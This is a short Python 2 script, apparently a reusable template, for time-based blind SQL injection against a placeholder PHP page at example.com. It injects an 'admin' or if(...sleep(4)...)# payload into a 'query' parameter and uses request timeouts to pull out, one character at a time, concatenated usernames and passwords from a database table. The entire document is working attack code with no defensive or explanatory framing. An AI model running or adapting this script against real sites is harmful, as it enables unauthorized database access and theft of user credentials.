#time blind-sqli retrieve data model
##simple get

import urllib2
import urllib

url = "http://example.com/index.php?"
p = 'select concat(username,0x7e,password) from motto limit 3,1'
data = ''

for i in range(1,30):
	for c in range(33,127):
		payload = "admin' or if(ord(mid((%s),%d,1)) = %d,sleep(4),0)#" % (p,i,c)
		d = {'query':payload}
		u = url + urllib.urlencode(d)
		req = urllib2.Request(u)
		try:
			urllib2.urlopen(req,timeout=3)
		except:
			data += chr(c)
			print data
